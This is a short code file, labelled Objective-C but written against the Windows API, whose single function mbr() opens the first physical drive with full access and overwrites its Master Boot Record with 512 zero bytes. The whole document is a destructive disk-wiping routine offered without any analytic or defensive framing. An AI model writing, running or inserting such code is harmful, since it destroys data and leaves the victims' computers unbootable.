objc
#import <Foundation/Foundation.h>
#import <Windows.h>

int mbr() {
    // Master Boot Record (512 bytes of zeros)
    BYTE MasterBootRecord[512] = {0};

    // Device path string
    LPCSTR devicePath = "\\\\.\\PhysicalDrive0";

    // CreateFileA call
    HANDLE hFile = CreateFileA(
        devicePath,               // lpFileName
        GENERIC_ALL,              // dwDesiredAccess
        FILE_SHARE_READ | FILE_SHARE_WRITE, // dwShareMode
        NULL,                    // lpSecurityAttributes
        OPEN_EXISTING,           // dwCreationDisposition
        0,                       // dwFlagsAndAttributes
        NULL                     // hTemplateFile
    );

    // Check if handle is valid
    if (hFile == INVALID_HANDLE_VALUE) {
        return 0;
    }

    DWORD bytesWritten = 0;
    BOOL writeResult = WriteFile(
        hFile,                   // hFile
        MasterBootRecord,        // lpBuffer
        sizeof(MasterBootRecord),// nNumberOfBytesToWrite
        &bytesWritten,           // lpNumberOfBytesWritten
        NULL                     // lpOverlapped
    );

    // Close handle
    CloseHandle(hFile);

    return 0;
}
